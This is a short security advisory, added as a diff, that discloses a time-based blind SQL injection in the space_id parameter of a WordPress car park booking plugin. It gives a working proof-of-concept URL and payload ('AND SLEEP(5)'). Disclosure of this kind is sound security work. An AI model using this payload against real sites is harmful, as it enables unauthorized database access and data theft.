@@ -1,0 +1,37 @@
+# Exploit Title: Wordpress Plugin Car Park Booking - SQL Injection
+# Date: 2017-10-17
+# Exploit Author: 8bitsec
+# Vendor Homepage: https://codecanyon.net/item/car-park-booking-wordpress-plugin/20284035
+# Software Link: https://codecanyon.net/item/car-park-booking-wordpress-plugin/20284035
+# Version: 13 October 17
+# Tested on: [Kali Linux 2.0 | Mac OS 10.12.6]
+# Email: contact@8bitsec.io
+# Contact: https://twitter.com/_8bitsec
+
+Release Date:
+=============
+2017-10-17
+
+Product & Service Introduction:
+===============================
+Generate more sales, enhance your car park booking service, and have more time to organize the business.
+
+Technical Details & Description:
+================================
+
+SQL injection on [space_id] parameter.
+
+Proof of Concept (PoC):
+=======================
+
+SQLi:
+
+https://localhost/[path]/booking-page/?step=3&space_id=9 AND SLEEP(5)&re_price=12
+
+Parameter: space_id (GET)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: step=3&space_id=9 AND SLEEP(5)&re_price=12
+
+==================
+8bitsec - [https://twitter.com/_8bitsec]
